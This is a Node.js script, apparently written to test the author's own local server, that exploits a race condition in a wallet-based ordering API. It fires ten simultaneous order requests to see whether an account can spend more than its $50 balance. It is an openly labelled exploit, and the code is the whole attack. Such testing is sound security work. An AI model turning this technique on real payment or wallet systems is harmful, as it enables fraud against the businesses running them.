const http = require('http');

// Configuration
const BASE_URL = 'http://localhost:5000'; // Make sure your server is running on this port
const ATTACKER_EMAIL = `attacker_${Date.now()}@test.com`;
const ATTACKER_PASSWORD = 'password123';

// Helper to make HTTP requests
function request(method, path, body = null, token = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'localhost',
            port: 5000, // Change if your port is different
            path: '/api' + path,
            method: method,
            headers: {
                'Content-Type': 'application/json',
            }
        };

        if (token) options.headers['x-auth-token'] = token;

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    resolve(data);
                }
            });
        });

        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

async function runExploit() {
    console.log('--- Starting Race Condition Exploit Simulation ---');

    try {
        // 1. Register Attacker
        console.log(`\n1. Registering new user: ${ATTACKER_EMAIL}...`);
        const regRes = await request('POST', '/users/register', {
            name: 'Attacker',
            email: ATTACKER_EMAIL,
            password: ATTACKER_PASSWORD,
            role: 'user'
        });

        if (!regRes.token) {
            console.error('Registration failed:', regRes);
            return;
        }
        const token = regRes.token;
        let initialBalance = regRes.user.walletBalance || 50; // Assuming default is 50
        console.log(`   User created. Initial Balance: $${initialBalance}`);

        // 2. Find a service to buy (Assuming there is at least one service or we can mock an order)
        // For this test, we need a service/product. If checkout requires service IDs inside body.
        // Let's assume we are hitting the /orders/checkout endpoint or placing single orders.
        // Based on code review: /api/orders (POST) takes { serviceId }.

        // Let's Create a Dummy Service first if possible (Requires Admin) or just try to blindly hit an endpoint 
        // OR better: The user likely has services. Let's just try to hit the "checkout" vulnerability if it exists via bulk or single.
        // The code showed: router.post('/', ...) for single order.
        // And router.post('/checkout', ...) for bulk.

        // We will simulate 10 requests to buy a service that costs $20.
        // If balance is $50, only 2 should succeed.
        // If 5 succeed, we spent $100 with $50 balance. -> EXPLOIT CONFIRMED.

        console.log('\n2. Preparing Attack...');
        // We need a valid service ID. Since we can't easily query without knowing DB state, 
        // We will try to fetch services first.
        const services = await request('GET', '/users/me', null, token); // Actually services endpoint is open usually?
        // Let's try to assume user has to insert a Service ID manually or we assume one exists.
        // For this script to work out-of-the-box, we need a Service ID.
        // Let's ask the user to provide one, OR we just simulate the request validation part.

        console.log('   NOTE: This script assumes a service with ID "6776b777b5a8e02d84955776" exists and costs ~20.');
        console.log('   (If this fails, you need to replace the serviceId in the script with a real one from your DB)');

        const serviceId = "6776b777b5a8e02d84955776"; // DUMMY ID - REPLACE ME

        // 3. Launch Attack
        const requestCount = 10;
        console.log(`\n3. Launching ${requestCount} simultaneous requests...`);

        const attackPromises = [];
        for (let i = 0; i < requestCount; i++) {
            attackPromises.push(
                request('POST', '/orders', { serviceId: serviceId }, token)
            );
        }

        const results = await Promise.all(attackPromises);

        // 4. Analyze Results
        let successCount = 0;
        results.forEach(r => {
            // Adjust logic based on successful response structure
            if (r && r._id) successCount++;
        });

        console.log(`\n--- Results ---`);
        console.log(`Requests Sent: ${requestCount}`);
        console.log(`Successful Orders: ${successCount}`);
        console.log(`Initial Balance: $${initialBalance}`);

        // Check final balance
        const me = await request('GET', '/users/me', null, token);
        console.log(`Final Balance: $${me.walletBalance}`);

        if (successCount > 2 && me.walletBalance < 0) {
            console.log(`\n[CRITICAL] VULNERABILITY CONFIRMED!`);
            console.log(`You spent more money than you had. Your balance is negative.`);
        } else if (successCount > 2) {
            console.log(`\n[WARNING] Potential Race Condition. You bought ${successCount} items with $50.`);
        } else {
            console.log(`\n[SAFE] System handled requests correctly.`);
        }

    } catch (err) {
        console.error('Exploit failed:', err);
    }
}

runExploit();
